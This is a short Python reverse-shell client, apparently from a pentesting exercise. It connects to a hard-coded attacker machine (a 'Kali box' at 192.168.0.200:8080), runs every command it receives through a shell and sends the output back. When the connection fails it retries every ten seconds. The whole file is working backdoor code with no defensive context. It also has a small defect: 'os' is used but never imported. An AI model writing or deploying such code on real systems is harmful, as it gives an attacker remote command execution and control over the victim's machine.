#!/usr/bin/env python
#python 3
#Client

import socket
import subprocess
import sys
import time

#Kali box
SERV_ADDRESS = ("192.168.0.200", 8080)
state = True

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(SERV_ADDRESS)
    return s

def try2connect(socket):
    global state, total

    while(True):
        command = socket.recv(1024)
        print("command %s" % command)
        if 'exit' in command.decode():
            socket.close()
            state = False
            break
        elif "restart" in command.decode():
            total = 0
            make_connection()
            socket.close()
        elif "cd " in command.decode():
            directory = command.decode()[3:]
            os.chdir(directory)
        else:
            run_shell(socket, command)

def run_shell(socket, command):
    cmd = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    socket.send(cmd.stdout.read())
    socket.send(cmd.stderr.read())

def make_connection():
    global total, delay

    try:
        socket = create_socket()
        print("Connected")
        while not (socket.connect_ex(SERV_ADDRESS) == 0):
            try2connect(socket)
    except:
    #except [ConnectionRefusedError, ConnectionResetError]:
        total += delay
        times = total/delay
        print('Retry in {} seconds already tried {} times'.format(delay, int(times))) if state else print("Exit program")
        time.sleep(delay)

total = 0
delay = 10

while(state):
    make_connection()
